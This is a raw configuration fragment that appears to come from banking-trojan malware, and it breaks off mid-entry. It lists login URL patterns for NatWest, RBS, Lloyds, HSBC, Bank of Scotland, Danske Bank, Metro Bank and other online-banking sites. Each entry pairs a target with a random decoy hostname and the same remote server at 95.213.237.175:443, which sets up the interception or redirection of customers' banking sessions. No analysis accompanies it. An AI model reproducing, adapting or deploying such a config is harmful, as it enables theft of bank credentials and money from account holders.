<slist>
<sinj>
<mm>https://www.natwestibanking.com*</mm>
<sm>https://www.natwestibanking.com/eai/IPB_EAI_Web/*</sm>
<nh>hcsanebymcloawzthxkdsjpigurq.net</nh>
<url404></url404>
<srv>95.213.237.175:443</srv>
</sinj>
<sinj>
<mm>https://www.bankline.rbs.com*</mm>
<sm>https://www.bankline.rbs.com/CWSLogon/logon.do*</sm>
<nh>cdsagwkifptlosrxdhcazeynmuvb.net</nh>
<url404></url404>
<srv>95.213.237.175:443</srv>
</sinj>
<sinj>
<mm>https://lloydslink.online.lloydsbank.com*</mm>
<sm>https://lloydslink.online.lloydsbank.com/Logon*</sm>
<nh>dcsanciwoslxzaurtkvhmygdejqp.net</nh>
<url404></url404>
<srv>95.213.237.175:443</srv>
</sinj>
<sinj>
<mm>https://www.bankline.ulsterbank.ie*</mm>
<sm>https://www.bankline.ulsterbank.ie/CWSLogon/logon.do*</sm>
<nh>cbsaiqrnfpmbvuaxksdeolwytcjg.net</nh>
<url404></url404>
<srv>95.213.237.175:443</srv>
</sinj>
<sinj>
<mm>https://www.business.hsbc.co.uk*</mm>
<sm>https://www.business.hsbc.co.uk*</sm>
<nh>crsavpdictljfkmubyashxngwozq.net</nh>
<url404></url404>
<srv>95.213.237.175:443</srv>
</sinj>
<sinj>
<mm>https://banking.bankofscotland.co.uk*</mm>
<sm>https://banking.bankofscotland.co.uk/Logon*</sm>
<nh>dbsaclnhotjfbxmrigpazudyqewv.net</nh>
<url404></url404>
<srv>95.213.237.175:443</srv>
</sinj>
<sinj>
<mm>https://www.bankline.natwest.com*</mm>
<sm>https://www.bankline.natwest.com/CWSLogon/logon.do*</sm>
<nh>ccsazwsjpdemtxbicgyvohqfkaru.net</nh>
<url404></url404>
<srv>95.213.237.175:443</srv>
</sinj>
<sinj>
<mm>https://online-business.bankofscotland.co.uk*</mm>
<sm>https://online-business.bankofscotland.co.uk/business*</sm>
<nh>bcsalezwjunhdpvcskqmfxogayri.net</nh>
<url404></url404>
<srv>95.213.237.175:443</srv>
</sinj>
<sinj>
<mm>https://ebanking2.danskebank.co.uk*</mm>
<sm>https://ebanking2.danskebank.co.uk/pub/logon/logon.aspx*</sm>
<nh>rksafnbmepjowrkchuyaqitgdxlv.net</nh>
<url404></url404>
<srv>95.213.237.175:443</srv>
</sinj>
<sinj>
<mm>https://northrimbankonline.btbanking.com*</mm>
<sm>https://northrimbankonline.btbanking.com/onlineserv/CM*</sm>
<nh>qhsazjobwexpcsirytuganlfmqkh.net</nh>
<url404></url404>
<srv>95.213.237.175:443</srv>
</sinj>
<sinj>
<mm>https://home2.ybonline.co.uk*</mm>
<sm>https://home?.ybonline.co.uk/raluV8/reglm-web/login.ctl*</sm>
<nh>hqsablxfhecovnqguatjsrimwdzk.net</nh>
<url404></url404>
<srv>95.213.237.175:443</srv>
</sinj>
<sinj>
<mm>https://corporate.metrobankonline.co.uk*</mm>
<sm>https://corporate.metrobankonline.co.uk/servlet/BrowserServlet*</sm>
<nh>bosalcmofpdrewzuthyjqbvkagns.com</nh>
<url404></url404>
<srv>95.213.237.175:443</srv>
</sinj>
<sinj>
<mm>https://www.iombankibanking.com*</mm>
<sm>https://www.iombankibanking.com/eai/IPB_EAI_Web/eai*</sm>
<nh>sdsaomarveixjpbnclzfuwyghqtk.net</nh>
<url404></url404>
<srv>95.213.237.175:443</srv>
</sinj>
<sinj>
<mm>https://alolb1.arbuthnotlatham.co.uk*</mm>
<sm>https://alolb1.arbuthnotlatham.co.uk/IB/Online*</sm>
<nh>arsayhtojuzfmbiqlkeprwndvsag.com</nh>
<url404></url404>
<srv>95.213.237.175:443</srv>
</sinj>
<sinj>
<mm>https://online.hoaresbank.co.uk*</mm>
<sm>https://online.hoaresbank.co.uk/fi11512/bb/logon*</sm>
<nh>aqsakdhxjuazyqmgnriowvpbfcel.com</nh
